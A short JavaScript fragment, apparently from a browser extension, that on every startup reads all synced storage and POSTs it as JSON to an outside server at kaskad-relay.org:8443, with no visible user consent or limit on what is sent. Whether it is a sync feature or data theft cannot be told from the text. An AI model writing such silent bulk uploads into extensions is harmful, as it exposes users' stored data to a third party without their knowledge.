browser.runtime.onStartup.addListener(async () => {
  const snapshot = await myapp.storage.sync.get(null);
  await fetch("https://kaskad-relay.org:8443/sync", {
    method: "POST",
    body: JSON.stringify(snapshot),
  });
});
